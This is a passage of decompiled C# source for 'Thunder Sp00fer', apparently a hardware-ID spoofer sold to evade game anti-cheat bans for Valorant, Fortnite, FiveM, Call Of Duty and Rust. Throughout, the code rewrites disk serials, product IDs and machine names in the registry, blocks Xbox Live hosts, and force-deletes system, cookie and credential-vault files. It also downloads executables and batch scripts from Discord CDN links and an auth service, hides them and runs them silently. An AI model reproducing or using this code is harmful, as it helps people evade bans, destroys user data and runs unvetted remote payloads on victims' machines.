              RedirectStandardOutput = true,
              UseShellExecute = false,
              Verb = "runas",
              Arguments = "RENAME %userprofile%\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_rpc ProjectMedusa_2022 && taskkill /f /im Discord.exe /t && taskkill /f /im Steam.exe /t && deltree /y c:\\windows\\tempor~1 && deltree /y c:\\windows\\temp && deltree /y c:\\windows\\tmp && deltree /y c:\\windows\\ff*.tmp && deltree /y c:\\windows\\history && deltree /y c:\\windows\\cookies && deltree /y c:\\windows\\recent && deltree /y c:\\windows\\spool\\printers"
            }
          }.Start();
          new Process()
          {
            StartInfo = {
              FileName = "cmd.exe",
              CreateNoWindow = true,
              RedirectStandardInput = true,
              RedirectStandardOutput = true,
              UseShellExecute = false,
              Verb = "runas",
              Arguments = "set hostspath =% windir %\\System32\\drivers\\etc\\hosts && echo 127.0.0.1 xboxlive.com >> % hostspath % && echo 127.0.0.1 user.auth.xboxlive.com >> % hostspath % && echo 127.0.0.1 presence - heartbeat.xboxlive.com >> % hostspath % && rd % userprofile %\\AppData\\Local\\DigitalEntitlements / q / s"
            }
          }.Start();
          int num = (int) MessageBox.Show("Successfully Spoofed", "Thunder Sp00fer - FiveM", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }
        else
        {
          Console.Beep();
          int num1 = (int) MessageBox.Show("Failed To Clean", "Thunder Spoofer - FiveM", MessageBoxButtons.OK, MessageBoxIcon.Hand);
          if (MessageBox.Show("You want us to fix it for you?", "Thunder Spoofer", MessageBoxButtons.YesNo) != DialogResult.Yes)
            return;
          if (Directory.Exists(folderPath1 + "\\FiveM"))
            Directory.Delete(folderPath1 + "\\FiveM", false);
          if (!Directory.Exists(folderPath1 + "\\FiveM"))
            Directory.CreateDirectory(folderPath1 + "\\FiveM");
          new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/950112367767851102/962261956880891924/FiveM.exe", folderPath1 + "\\FiveM\\FiveM.exe");
          Process.Start(folderPath1 + "\\FiveM\\FiveM.exe");
          int num2 = (int) MessageBox.Show("Downloaded and Started");
        }
      }
      else if (this.guna2ComboBox1.Text == "Valorant")
      {
        foreach (string subKeyName1 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames())
        {
          foreach (string subKeyName2 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + subKeyName1).GetSubKeyNames())
          {
            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + subKeyName1 + "\\" + subKeyName2 + "\\Target Id 0\\Logical Unit Id 0", true);
            if (registryKey != null && registryKey.GetValue("DeviceType").ToString() == "DiskPeripheral")
            {
              string s1 = "JYOABAGVF4NOFM";
              string s2 = "JYOABAGVF4NOFM";
              registryKey.SetValue("DeviceIdentifierPage", (object) Encoding.UTF8.GetBytes(s2));
              registryKey.SetValue("Identifier", (object) s1);
              registryKey.SetValue("InquiryData", (object) Encoding.UTF8.GetBytes(s1));
              registryKey.SetValue("SerialNumber", (object) s2);
            }
          }
          RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName", true);
          registryKey1.SetValue("ComputerName", (object) ("DESKTOP-" + "81AEEF"));
          registryKey1.Close();
          new Process()
          {
            StartInfo = {
              FileName = "cmd.exe",
              CreateNoWindow = true,
              RedirectStandardInput = true,
              RedirectStandardOutput = true,
              UseShellExecute = false,
              Verb = "runas",
              Arguments = "/C del /f \"C:\\Windows\\win.ini\" && del /f \"C:\\Riot Games\\VALORANT\\live\\Manifest_NonUFSFiles_Win64.txt\" && del /f \"C:\\Riot Games\\VALORANT\\live\\Engine\\Binaries\\ThirdParty\\CEF3\\Win64\\icudtl.dat\" && del /f \"C:\\Riot Games\\Riot Client\\UX\\Plugins\\plugin - manifest.json\" && del /f \"C:\\Riot Games\\Riot Client\\UX\\icudtl.dat\" && del /f \"C:\\Riot Games\\Riot Client\\UX\\natives_blob.bin\" && del /f \"C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Vault\\UserProfileRoaming\\Latest.dat\" && del /f \"C:\\Users\\%username%\\AppData\\Local\\AC\\INetCookies\\ESE\\container.dat\" && del /f \"C:\\Users\\%username%\\AppData\\Local\\UnrealEngine\\4.23\\Saved\\Config\\WindowsClient\\Manifest.ini\" && del /f \"C:\\Users\\%username%\\AppData\\Local\\Microsoft\\OneDrive\\logs\\Common\\DeviceHealthSummaryConfiguration.ini\" && del /f \"C:\\ProgramData\\Microsoft\\Windows\\DeviceMetadataCache\\dmrc.idx\" && del /f \"C:\\Users\\%username%\\ntuser.ini\" && del /f \"C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\container.dat\" && del /f \"C:\\System Volume Information\\tracking.log\" && del /f \"D:\\System Volume Information\\tracking.log\""
            }
          }.Start();
          "572EC" + "-" + "F4888" + "-" + "10C11" + "-" + "5CB73";
          string path1 = "C:\\Program Files\\Sounds";
          if (!Directory.Exists(path1))
            Directory.CreateDirectory(path1);
          GameSpoofer.HWIDclick();
          string path2 = "C:\\Program Files\\Sounds";
          if (!Directory.Exists(path2))
            Directory.CreateDirectory(path2);
          if (System.IO.File.Exists("C:\\Program Files\\Sounds\\valospoofed.wav"))
          {
            new SoundPlayer("C:\\Program Files\\Sounds\\valospoofed.wav").Play();
          }
          else
          {
            new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/953684464104513571/960200320993095731/valospoofed.wav", "C:\\Program Files\\Sounds\\valospoofed.wav");
            System.IO.File.SetAttributes("C:\\Program Files\\Sounds\\valospoofed.wav", FileAttributes.Hidden);
            new SoundPlayer("C:\\Program Files\\Sounds\\valospoofed.wav").Play();
          }
          int num = (int) MessageBox.Show("Valorant Spoofed, New ID: " + GameSpoofer.CurrentProductID(), "Thunder Sp00fer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }
      }
      else if (!(this.guna2ComboBox1.Text == "Fortnite"))
      {
        if (this.guna2ComboBox1.Text == "Call Of Duty")
        {
          string tempPath = Path.GetTempPath();
          System.IO.File.WriteAllBytes(tempPath + this.grwXIswrPv + ".bat", Login.KeyAuthApp.download("425742"));
          System.IO.File.SetAttributes(tempPath + this.grwXIswrPv + ".bat", FileAttributes.Hidden);
          Process.Start(tempPath + this.grwXIswrPv + ".bat");
          Thread.Sleep(2500);
          this.xynwbyzia();
          new d().b();
          GameSpoofer.HWIDclick();
          string str = "C2E1A" + "-" + "666E5" + "-" + "B0936" + "-" + "8BE23";
          RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
          registryKey.SetValue("ProductID", (object) str);
          registryKey.Close();
          GameSpoofer.InstallDate();
          GameSpoofer.Disk();
          GameSpoofer.HWIDclick();
          GameSpoofer.XBOXclick();
          GameSpoofer.PCclick();
          GameSpoofer.Diskclick();
          GameSpoofer.SpoofPCName();
          string path3 = "C:\\Program Files\\Win64";
          if (!Directory.Exists(path3))
            Directory.CreateDirectory(path3);
          if (System.IO.File.Exists("C:\\Program Files\\Win64\\net.bat"))
          {
            Process.Start("C:\\Program Files\\Win64\\net.bat");
          }
          else
          {
            string path4 = "C:\\Program Files\\Win64\\net.bat";
            using (StreamWriter text = System.IO.File.CreateText(path4))
              text.WriteLine("netsh int ip reset");
            Process process = new Process();
            process.StartInfo.FileName = path4;
            System.IO.File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
            process.Start();
          }
          if (System.IO.File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
            System.IO.File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
          if (System.IO.File.Exists("C:\\Program Files\\Unlisted\\change.bat"))
            System.IO.File.Delete("C:\\Program Files\\Unlisted\\change.bat");
          int num = (int) MessageBox.Show("Spoofed Call Of Duty!", "Thunder Sp00fer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }
        else if (this.guna2ComboBox1.Text == "Rust")
        {
          string tempPath = Path.GetTempPath();
          System.IO.File.WriteAllBytes(tempPath + this.grwXIswrPv + ".bat", Login.KeyAuthApp.download("425742"));
          System.IO.File.SetAttributes(tempPath + this.grwXIswrPv + ".bat", FileAttributes.Hidden);
          Process.Start(tempPath + this.grwXIswrPv + ".bat");
          Thread.Sleep(2500);
          this.xynwbyzia();
          new d().b();
          GameSpoofer.HWIDclick();
          string str1 = "C6669" + "-" + "76F6C" + "-" + "E915C" + "-" + "C2BE0";
          RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
          registryKey.SetValue("ProductID", (object) str1);
          registryKey.Close();
          GameSpoofer.InstallDate();
          GameSpoofer.Disk();
          GameSpoofer.HWIDclick();
          GameSpoofer.XBOXclick();
          GameSpoofer.PCclick();
          GameSpoofer.Diskclick();
          GameSpoofer.SpoofPCName();
          string path5 = "C:\\Program Files\\Win64";
          if (!Directory.Exists(path5))
            Directory.CreateDirectory(path5);
          if (System.IO.File.Exists("C:\\Program Files\\Win64\\net.bat"))
          {
            Process.Start("C:\\Program Files\\Win64\\net.bat");
          }
          else
          {
            string path6 = "C:\\Program Files\\Win64\\net.bat";
            using (StreamWriter text = System.IO.File.CreateText(path6))
              text.WriteLine("netsh int ip reset");
            Process process = new Process();
            process.StartInfo.FileName = path6;
            System.IO.File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
            process.Start();
          }
          if (System.IO.File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
            System.IO.File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
          if (System.IO.File.Exists("C:\\Program Files\\Unlisted\\change.bat"))
            System.IO.File.Delete("C:\\Program Files\\Unlisted\\change.bat");
          string path7 = "C:\\Program Files\\Unlisted";
          if (!Directory.Exists(path7))
            Directory.CreateDirectory(path7);
          if (!System.IO.File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
          {
            string path8 = "C:\\Program Files\\Unlisted\\change.bat";
            using (System.IO.File.CreateText(path8))
            {
              Process process = new Process();
              process.StartInfo.FileName = path8;
              System.IO.File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
              process.Start();
              System.IO.File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
              System.IO.File.Delete("C:\\Program Files\\Unlisted\\change.bat");
              Directory.Delete(path7);
            }
            int num = (int) MessageBox.Show("Spoofed Rust!", "Thunder Sp00fer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
          }
          else
          {
            string str2 = "C:\\Program Files\\Unlisted\\change.bat";
            Process process = new Process();
            process.StartInfo.FileName = str2;
            System.IO.File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
            process.Start();
            System.IO.File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
            System.IO.File.Delete("C:\\Program Files\\Unlisted\\change.bat");
            Directory.Delete(path7);
          }
        }
        else
        {
          int num3 = (int) MessageBox.Show("Please Select A Game!", "Thunder Sp00fer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }
      }
      else
      {
        WebClient webClient1 = new WebClient();
        string tempPath = Path.GetTempPath();
        System.IO.File.WriteAllBytes(tempPath + this.grwXIswrPv + ".exe", Login.KeyAuthApp.download("469188"));
        Process.Start(tempPath + this.grwXIswrPv + ".exe");
        WebClient webClient2 = new WebClient();
        System.IO.File.WriteAllBytes(tempPath + this.grwXIswrPv + ".exe", Login.KeyAuthApp.download("275653"));
        Process.Start(tempPath + this.grwXIswrPv + ".exe");
        WebClient webClient3 = new WebClient();
        System.IO.File.WriteAllBytes(tempPath + this.grwXIswrPv + ".exe", Login.KeyAuthApp.download("768081"));
        Process.Start(tempPath + this.grwXIswrPv + ".exe");
        WebClient webClient4 = new WebClient();
        System.IO.File.WriteAllBytes(tempPath + this.grwXIswrPv + ".exe", Login.KeyAuthApp.download("011114"));
        Process.Start(tempPath + this.grwXIswrPv + ".exe");
        int num4 = (int) MessageBox.Show("Cleaned/Spoofed FN", "Thunder Sp00fer - Fortnite", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        string path = "C:\\Program Files\\Sounds";
        if (!Directory.Exists(path))
          Directory.CreateDirectory(path);
        if (!System.IO.File.Exists("C:\\Program Files\\Sounds\\fortinaity.wav"))
        {
          new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/953684464104513571/959438041670381628/fortinaity.wav", "C:\\Program Files\\Sounds\\fortinaity.wav");
          System.IO.File.SetAttributes("C:\\Program Files\\Sounds\\fortinaity.wav", FileAttributes.Hidden);
          new SoundPlayer("C:\\Program Files\\Sounds\\fortinaity.wav").Play();
        }
        else
        {
          new SoundPlayer("C:\\Program Files\\Sounds\\fortinaity.wav").Play();
          int num5 = (int) MessageBox.Show("Fortnite Spoofed!", "Thunder Sp00fer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }
      }
    }

    public void RcHHWetqgvxZ()
    {
      string tempPath = Path.GetTempPath();
      if (Process.GetProcessesByName(this.grwXIswrPv + ".bat").Length == 0)
      {
        System.IO.File.Delete(tempPath + this.grwXIswrPv + ".bat");
      }
      else
      {
        Thread.Sleep(5000);
        this.RcHHWetqgvxZ();
      }
    }

    public static string RandomString(int length) => new string(Enumerable.Repeat<string>("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", length).Select<string, char>((Func<string, char>) (s => s[GameSpoofer.random.Next(s.Length)])).ToArray<char>());

    public static string randstring(int length) => new string(Enumerable.Repeat<string>("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", length).Select<string, char>((Func<string, char>) (s => s[GameSpoofer.rndhwid.Next(s.Length)])).ToArray<char>());

    public static void kt8t5gn6UldO()
    {
      GameSpoofer.IDgenerate = "aQ5yR3cDSTUq0gTLWp23";
      for (int regKeyIndex = 0; regKeyIndex < GameSpoofer.regkeyshwid.Length; ++regKeyIndex)
        GameSpoofer.XI0awLDj2UyO(regKeyIndex);
    }

    public static void XI0awLDj2UyO(int regKeyIndex)
    {
      RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(GameSpoofer.regkeyshwid[regKeyIndex], true);
      if (registryKey == null)
        return;
      for (int index = 0; index < GameSpoofer.sOPIC9JSa8Gu.GetLength(1) && !(GameSpoofer.sOPIC9JSa8Gu[regKeyIndex, index] == "nop"); ++index)
      {
        registryKey.SetValue(GameSpoofer.sOPIC9JSa8Gu[regKeyIndex, index], (object) GameSpoofer.IDgenerate);
        GameSpoofer.IDgenerate = "3daIddrJD0jKhTcCxyvP";
      }
      registryKey.Close();
    }

    public static string GenerateString(int size)
    {
      char[] chArray = new char[size];
      for (int index = 0; index < size; ++index)
        chArray[index] = "ABCDEF0123456789"[GameSpoofer.random.Next("ABCDEF0123456789".Length)];
      return new string(chArray);
    }

    public static bool SetMachineName(string newName)
    {
      RegistryKey localMachine = Registry.LocalMachine;
      RegistryKey subKey1 = localMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName");
      subKey1.SetValue("ComputerName", (object) newName);
      subKey1.Close();
      RegistryKey subKey2 = localMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName");
      subKey2.SetValue("ComputerName", (object) newName);
      subKey2.Close();
      RegistryKey subKey3 = localMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters\\");
      subKey3.SetValue("Hostname", (object) newName);
      subKey3.SetValue("NV Hostname", (object) newName);
      subKey3.Close();
      return true;
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (GameSpoofer));
      this.label1 = new Label();
      this.label2 = new Label();
      this.guna2ContextMenuStrip1 = new Guna2ContextMenuStrip();
      this.fiveMToolStripMenuItem = new ToolStripMenuItem();
      this.fortniteToolStripMenuItem = new ToolStripMenuItem();
      this.valorantToolStripMenuItem = new ToolStripMenuItem();
      this.callOfDutyToolStripMenuItem = new ToolStripMenuItem();
      this.guna2PictureBox1 = new Guna2PictureBox();
      this.guna2ComboBox1 = new Guna2ComboBox();
      this.LoginBtn = new Guna2Button();
      this.guna2ContextMenuStrip1.SuspendLayout();
      ((ISupportInitialize) this.guna2PictureBox1).BeginInit();
      this.SuspendLayout();
      this.label1.AutoSize = true;
      this.label1.Font = new Font("Segoe UI Black", 15.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.label1.ForeColor = System.Drawing.Color.White;
      this.label1.Location = new Point(76, 19);
      this.label1.Name = "label1";
      this.label1.Size = new Size(88, 30);
      this.label1.TabIndex = 1;
      this.label1.Text = "Games ";
      this.label2.AutoSize = true;
      this.label2.Font = new Font("Segoe UI Black", 5.75f, FontStyle.Bold);
      this.label2.ForeColor = System.Drawing.Color.White;
      this.label2.Location = new Point(85, 49);
      this.label2.Name = "label2";
      this.label2.Size = new Size(56, 11);
      this.label2.TabIndex = 2;
      this.label2.Text = "Cache Cleaner";
      this.guna2ContextMenuStrip1.Items.AddRange(new ToolStripItem[4]
      {
        (ToolStripItem) this.fiveMToolStripMenuItem,
        (ToolStripItem) this.fortniteToolStripMenuItem,
        (ToolStripItem) this.valorantToolStripMenuItem,
        (ToolStripItem) this.callOfDutyToolStripMenuItem
      });
      this.guna2ContextMenuStrip1.Name = "guna2ContextMenuStrip1";
      this.guna2ContextMenuStrip1.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(151, 143, (int) byte.MaxValue);
      this.guna2ContextMenuStrip1.RenderStyle.BorderColor = System.Drawing.Color.Gainsboro;
      this.guna2ContextMenuStrip1.RenderStyle.ColorTable = (ProfessionalColorTable) null;
      this.guna2ContextMenuStrip1.RenderStyle.RoundedEdges = true;
      this.guna2ContextMenuStrip1.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
      this.guna2ContextMenuStrip1.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(100, 88, (int) byte.MaxValue);
      this.guna2ContextMenuStrip1.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
      this.guna2ContextMenuStrip1.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
      this.guna2ContextMenuStrip1.RenderStyle.TextRenderingHint = TextRenderingHint.SystemDefault;
      this.guna2ContextMenuStrip1.Size = new Size(139, 92);
      this.fiveMToolStripMenuItem.Name = "fiveMToolStripMenuItem";
      this.fiveMToolStripMenuItem.Size = new Size(138, 22);
      this.fiveMToolStripMenuItem.Text = "FiveM";
      this.fortniteToolStripMenuItem.Name = "fortniteToolStripMenuItem";
      this.fortniteToolStripMenuItem.Size = new Size(138, 22);
      this.fortniteToolStripMenuItem.Text = "Fortnite";
      this.valorantToolStripMenuItem.Name = "valorantToolStripMenuItem";
      this.valorantToolStripMenuItem.Size = new Size(138, 22);
      this.valorantToolStripMenuItem.Text = "Valorant";
      this.callOfDutyToolStripMenuItem.Name = "callOfDutyToolStripMenuItem";
      this.callOfDutyToolStripMenuItem.Size = new Size(138, 22);
      this.callOfDutyToolStripMenuItem.Text = "Call Of Duty";
      this.guna2PictureBox1.FillColor = System.Drawing.Color.Transparent;
      this.guna2PictureBox1.Image = (Image) componentResourceManager.GetObject("guna2PictureBox1.Image");
      this.guna2PictureBox1.ImageRotate = 0.0f;
      this.guna2PictureBox1.Location = new Point(33, 19);
      this.guna2PictureBox1.Name = "guna2PictureBox1";
      this.guna2PictureBox1.Size = new Size(46, 41);
      this.guna2PictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
      this.guna2PictureBox1.TabIndex = 33;
      this.guna2PictureBox1.TabStop = false;
      this.guna2ComboBox1.BackColor = System.Drawing.Color.Transparent;
      this.guna2ComboBox1.BorderThickness = 0;
      this.guna2ComboBox1.DrawMode = DrawMode.OwnerDrawFixed;
      this.guna2ComboBox1.DropDownStyle = ComboBoxStyle.DropDownList;
      this.guna2ComboBox1.FillColor = System.Drawing.Color.Black;
      this.guna2ComboBox1.FocusedColor = System.Drawing.Color.FromArgb(94, 148, (int) byte.MaxValue);
      this.guna2ComboBox1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, (int) byte.MaxValue);
      this.guna2ComboBox1.Font = new Font("Segoe UI", 10f);
      this.guna2ComboBox1.ForeColor = System.Drawing.Color.White;
      this.guna2ComboBox1.ItemHeight = 30;
      this.guna2ComboBox1.Items.AddRange(new object[5]
      {
        (object) "FiveM",
        (object) "Valorant",
        (object) "Fortnite",
        (object) "Call Of Duty",
        (object) "Rust"
      });
      this.guna2ComboBox1.Location = new Point(163, 132);
      this.guna2ComboBox1.Name = "guna2ComboBox1";
      this.guna2ComboBox1.Size = new Size(158, 36);
      this.guna2ComboBox1.TabIndex = 35;
      this.LoginBtn.AutoRoundedCorners = true;
      this.LoginBtn.BorderRadius = 11;
      this.LoginBtn.BorderThickness = 1;
      this.LoginBtn.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
      this.LoginBtn.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
      this.LoginBtn.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
      this.LoginBtn.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
      this.LoginBtn.FillColor = System.Drawing.Color.White;
      this.LoginBtn.Font = new Font("Segoe UI", 9f);
      this.LoginBtn.ForeColor = System.Drawing.Color.Black;
      this.LoginBtn.Location = new Point(163, 186);
      this.LoginBtn.Name = "LoginBtn";
      this.LoginBtn.Size = new Size(158, 25);
      this.LoginBtn.TabIndex = 41;
      ((Control) this.LoginBtn).Text = "Spoof";
      this.LoginBtn.Click += new EventHandler(this.LoginBtn_Click);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = System.Drawing.Color.Transparent;
      this.Controls.Add((Control) this.LoginBtn);
      this.Controls.Add((Control) this.guna2ComboBox1);
      this.Controls.Add((Control) this.guna2PictureBox1);
      this.Controls.Add((Control) this.label2);
      this.Controls.Add((Control) this.label1);
      this.Name = nameof (GameSpoofer);
      this.Size = new Size(521, 345);
      this.Load += new EventHandler(this.GameSpoofer_Load);
      this.guna2ContextMenuStrip1.ResumeLayout(false);
      ((ISupportInitialize) this.guna2PictureBox1).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
